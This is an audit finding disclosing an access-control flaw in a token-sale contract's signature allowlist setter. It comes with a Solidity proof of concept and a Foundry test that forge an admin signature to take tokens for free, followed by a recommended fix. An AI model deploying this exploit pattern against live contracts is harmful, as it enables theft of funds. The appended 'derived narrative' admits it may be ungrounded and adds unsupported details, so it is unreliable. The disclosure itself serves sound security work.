---
id: 23344
severity: "Critical"
---

# SignatureValidator::setAllowlist is unrestricted leadingto free purchases of tokens

## Description

SignatureValidator::setAllowlist is unrestricted.  
Since SignatureValidator inherited by ReferralManager and TokenBank this has downstream consequences.  
For TokenBank in particular this means that  

- attacker can call TokenBank::setAllowlist(maliciousAllowList) where maliciousAllowList::isSigner just returns true for the attacker  
- They can then spoof a signature by a Remora admin  
- call TokenBank::buyTokenOCP using the spoofed signature  
- buyTokenOCP indirectly calls _buyToken with useStableCoin == false  
- thus the entire code path guarded by `if (useStablecoin) { ... }` is skipped and no stablecoins are transferred from the attacker  

The same vulnerability could be used to steal all of ReferralManager's bonuses.  

Impact: Attacker can  

- purchase all remaining central tokens for free  
- steal from ReferralManager bonuses

## Proof of Concept

Add `MaliciousAllowlist.sol`

```solidity
contract MaliciousAllowlist {
    address maliciousSigner;
    constructor(address _maliciousSigner) {
        maliciousSigner = _maliciousSigner;
    }
    function isSigner(address signer) public view returns (bool) {
        return (signer == maliciousSigner);
    }
}
```

Add this test to `TokenBankTest.t.sol` (after adding import of `MaliciousSigner`)

```solidity
function test_cyfrin_buyTokenOCP_for_free() public {
    uint64 TOTAL_TOKENS = 10_000;
    _addCentralToTokenBank(60e6, true, 50_000);
    centralTokenProxy.mint(address(tokenBankProxy), uint64(TOTAL_TOKENS));
    address attacker = getDomesticUser(2);
    (address attackerSigner, uint256 sk) = makeAddrAndKey("BUY_SIGNER");
    /*
    * Attacker sets a malicious Allowlist and signs the buy instead of a Remora Admin
    */
    vm.startPrank(attackerSigner);
    MaliciousAllowlist maliciousAllowlist = new MaliciousAllowlist(attackerSigner);
    tokenBankProxy.setAllowlist(address(maliciousAllowlist));
    bytes32 typeHash = keccak256("BuyToken(address investor, address token, uint256 amount)");
    bytes32 structHash = keccak256(abi.encode(typeHash, attacker, address(centralTokenProxy),
    uint256(TOTAL_TOKENS)));
    bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(),
    structHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);
    bytes memory sig = abi.encodePacked(r, s, v);
    vm.stopPrank();
    /*
    * Now attacker buys all the tokens using the signature they created
    */
    vm.prank(attacker);
    tokenBankProxy.buyTokenOCP(attackerSigner, address(centralTokenProxy), TOTAL_TOKENS, sig);
    // attacker receives domestic child tokens
    assertEq(d_childTokenProxy.balanceOf(attacker), TOTAL_TOKENS);
}
```

## Recommendation

Since SignatureValidator is an abstract contract, setAllowlist should be an internal function.  

```solidity
- function setAllowlist(address allowlist) external {
+ function _setAllowlist(address allowlist) internal {
    if (allowlist == address(0)) revert InvalidAddress();
    SVStorage storage $ = _getSVStorageStorage();
    if ($._allowlist != allowlist) {
        $._allowlist = allowlist;
        emit AllowlistSet(allowlist);
    }
}
```

TokenBank should then expose setAllowlist as an external function with the restricted modifier  

```solidity
+ function setAllowlist(address signer) external restricted {
+     super._setAllowlist(signer);
+ }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an unrestricted allowlist setter in the abstract SignatureValidator contract that is inherited by TokenBank and ReferralManager. Because setAllowlist is declared as an external function without any access control, any address can replace the contract that determines which signatures are considered valid. An attacker can deploy a malicious allowlist whose isSigner function returns true for the attacker’s address, call TokenBank.setAllowlist with this contract, and then craft a signature that the system believes originates from a Remora admin. When the attacker invokes buyTokenOCP with the forged signature, the internal _buyToken function is called with useStableCoin set to false, causing the execution path that transfers stablecoins to be skipped. As a result, the attacker receives the requested central tokens without any stablecoin payment, effectively obtaining tokens for free. The same unrestricted setter can be used in ReferralManager to approve fraudulent signatures and claim referral bonuses, allowing the attacker to drain those rewards as well. This flaw was discovered during a security audit when the tester noticed that setAllowlist could be called by any account and demonstrated the exploit with a PoC that minted tokens to the attacker without any payment. The issue is hard to notice because the contract’s public functions appear to work correctly from a UI perspective – the purchase succeeds and tokens are credited, but the underlying accounting logic that should debit stablecoins is bypassed, leading to silent loss of funds. Users experience symptoms such as receiving tokens without being charged, balances that do not reflect any payment, or referral bonuses disappearing. The bug belongs to the class of access‑control misconfigurations that allow unauthorized state changes, specifically an unrestricted function that controls signature validation. To remediate, the setAllowlist function should be made internal (e.g., renamed _setAllowlist) and a separate external wrapper should be exposed with a restricted modifier that limits calls to authorized roles. This restores the intended trust boundary, ensures that only approved administrators can change the allowlist, and prevents attackers from spoofing signatures and acquiring tokens or bonuses without payment.
